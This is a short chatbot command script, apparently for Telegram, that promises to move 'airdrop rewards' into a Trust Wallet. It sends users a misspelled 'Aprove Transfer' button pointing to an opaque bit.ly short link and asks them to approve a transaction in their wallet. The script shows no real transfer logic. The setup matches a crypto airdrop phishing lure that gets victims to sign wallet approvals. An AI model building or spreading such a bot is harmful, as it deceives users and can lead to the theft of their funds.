/*CMD
  command: /transfer
  help: 
  need_reply: 
  auto_retry_time: 
  folder: 

  <<ANSWER
✅ Transfer Rewards from Airdrop Wallet to Trust Wallet
✅ To avoid errors please use Trust Wallet

⚠️Please set up your wallet first!
  ANSWER
  keyboard: ⚙️Settings, 📜Menu
  aliases: 💸Transfer
CMD*/

var buttons = [
  {title: "Aprove Transfer", url: "https://bit.ly/3EZU8Pn"},
  ];
Bot.sendInlineKeyboard(buttons, "☑️ Please Aprove transfer transaction in Trust Wallet!");
